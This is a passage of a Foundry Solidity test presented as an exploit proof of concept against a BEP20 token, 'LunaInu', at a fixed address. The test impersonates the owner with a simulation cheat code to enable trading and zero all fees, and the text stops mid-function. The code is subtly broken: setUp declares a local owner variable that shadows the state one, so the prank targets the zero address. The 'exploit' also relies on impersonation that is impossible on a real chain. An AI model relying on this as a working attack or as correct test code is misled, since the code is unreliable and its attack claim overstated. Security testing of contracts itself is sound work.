interface BEP20LUNAINU {
    function getOwner() external view returns (address);
    function tradingStatus(bool _status) external;
    function setFees_base1000(uint256 _liquidityFee, uint256 _marketingFee, uint256 _teamFee, uint256 _devFee) external;
    function totalFee() external view returns (uint256);
    function setMultipliers(uint256 _buy, uint256 _sell, uint256 _trans) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xf05A8a840F09aC83B79875B4275CEC1e60C2aBDf;
    address attacker = address(this);
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll use vm.prank to impersonate
        // Label the contract for debugging
        vm.label(TARGET, 'LunaInuToken');

        // Get the owner address from the contract
        address owner = BEP20LUNAINU(TARGET).getOwner();
        vm.label(owner, 'ContractOwner');
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Impersonate the owner
        vm.startPrank(owner);

        // Step 2: Enable trading (precondition)
        BEP20LUNAINU(TARGET).tradingStatus(true);

        // Step 3: Set all fees to zero - this will make totalFee = 0
        BEP20LUNAINU(TARGET).setFees_base1000(0, 0, 0, 0);

        vm.stopPrank();

        // Step 4: Verify totalFee is now 0
        uint256 totalFee = BEP20LUNAINU(TARGET).totalFee();
